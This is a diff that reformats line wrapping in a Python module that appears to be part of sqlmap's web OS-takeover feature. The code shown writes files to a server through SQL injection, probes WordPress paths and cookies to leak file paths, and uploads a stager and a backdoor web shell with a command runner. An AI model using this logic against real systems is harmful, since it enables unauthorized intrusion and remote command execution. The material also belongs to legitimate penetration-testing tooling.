@@ -54,6 +54,7 @@ from lib.core.settings import VIEWSTATE_REGEX
 from lib.request.connect import Connect as Request
 from thirdparty.six.moves import urllib as _urllib
 
+
 class Web:
     """
     This class defines web-oriented OS takeover functionalities for
@@ -142,7 +143,9 @@ class Web:
 
     def _webFileInject(self, fileContent, fileName, directory):
         outFile = posixpath.join(ntToPosixSlashes(directory), fileName)
-        uplQuery = getUnicode(fileContent).replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
+        uplQuery = getUnicode(fileContent).replace(SHELL_WRITABLE_DIR_TAG,
+                                                   directory.replace('/', '\\\\') if Backend.isOs(
+                                                       OS.WINDOWS) else directory)
         query = ""
 
         if isTechniqueAvailable(kb.technique):
@@ -152,8 +155,10 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery, conf.encoding))
-        query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile,
+                               HEXSTRING=hexencode(uplQuery, conf.encoding))
+        query = agent.prefixQuery(
+            query)  # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
         payload = agent.payload(newValue=query)
         page = Request.queryPage(payload)
 
@@ -214,7 +219,8 @@ class Web:
                 headers = {}
                 been = set([conf.url])
 
-                for match in re.finditer(r"=['\"]((https?):)?(//[^/'\"]+)?(/[\w/.-]*)\bwp-", kb.originalPage or "", re.I):
+                for match in re.finditer(r"=['\"]((https?):)?(//[^/'\"]+)?(/[\w/.-]*)\bwp-", kb.originalPage or "",
+                                         re.I):
                     url = "%s%s" % (conf.url.replace(conf.path, match.group(4)), "wp-content/wp-db.php")
                     if url not in been:
                         try:
@@ -239,7 +245,8 @@ class Web:
                     if place in conf.parameters:
                         value = re.sub(r"(\A|&)(\w+)=", r"\g<2>[]=", conf.parameters[place])
                         if "[]" in value:
-                            page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)
+                            page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False,
+                                                                 silent=True, noteResponseTime=False)
                             parseFilePaths(page)
 
                 cookie = None
@@ -249,14 +256,17 @@ class Web:
                     cookie = headers[HTTP_HEADER.SET_COOKIE]
 
                 if cookie:
-                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+                                   cookie)
                     if value != cookie:
-                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
+                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False,
+                                                       silent=True, noteResponseTime=False)
                         parseFilePaths(page)
 
                     value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=", cookie)
                     if value != cookie:
-                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
+                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False,
+                                                       silent=True, noteResponseTime=False)
                         parseFilePaths(page)
 
         directories = list(arrayizeValue(getManualDirectories()))
@@ -301,7 +311,8 @@ class Web:
             self._webFileInject(stagerContent, stagerName, directory)
 
             for match in re.finditer('/', directory):
-                self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
+                self.webBaseUrl = "%s://%s:%d%s/" % (
+                conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                 self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)
                 debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                 logger.debug(debugMsg)
@@ -332,13 +343,15 @@ class Web:
 
                     with open(filename, "w+b") as f:
                         _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
-                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
+                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(
+                            directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
                         f.write(_)
 
                     self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
 
                     for match in re.finditer('/', directory):
-                        self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
+                        self.webBaseUrl = "%s://%s:%d%s/" % (
+                        conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                         self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)
 
                         debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
@@ -377,15 +390,20 @@ class Web:
                     continue
 
                 _ = "tmpe%s.exe" % randomStr(lowercase=True)
-                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace(SHELL_WRITABLE_DIR_TAG, backdoorDirectory).replace(SHELL_RUNCMD_EXE_TAG, _)):
-                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, "runcmd", "runcmd.exe_"))
+                if self.webUpload(backdoorName, backdoorDirectory,
+                                  content=backdoorContent.replace(SHELL_WRITABLE_DIR_TAG, backdoorDirectory).replace(
+                                          SHELL_RUNCMD_EXE_TAG, _)):
+                    self.webUpload(_, backdoorDirectory,
+                                   filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, "runcmd", "runcmd.exe_"))
                     self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                     self.webDirectory = backdoorDirectory
                 else:
                     continue
 
             else:
-                if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):
+                if not self.webUpload(backdoorName,
+                                      posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory,
+                                      content=backdoorContent):
                     warnMsg = "backdoor has not been successfully uploaded "
                     warnMsg += "through the file stager possibly because "
                     warnMsg += "the user running the web server process "
